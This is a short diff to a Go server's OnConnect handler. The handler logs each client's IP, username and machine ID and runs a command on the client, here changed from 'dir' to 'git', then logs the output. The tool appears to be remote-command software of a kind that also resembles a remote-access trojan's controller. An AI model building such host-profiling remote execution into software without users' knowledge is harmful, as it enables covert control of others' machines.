@@ -43,11 +43,11 @@ func (c Client) OnConnect() {
 	if err == nil {
 		log.Printf("New client connected with IP %s and username %s (%s)", c.IP, basicSystemInfo.Username, basicSystemInfo.MachineID)
 	}
-	_, res, err := c.RunCommand("dir", false)
+	_, res, err := c.RunCommand("git", false)
 	if err != nil {
 		log.Println(err)
 	}
-	println(res)
+	log.Printf("output: %s", res)
 
 }
 
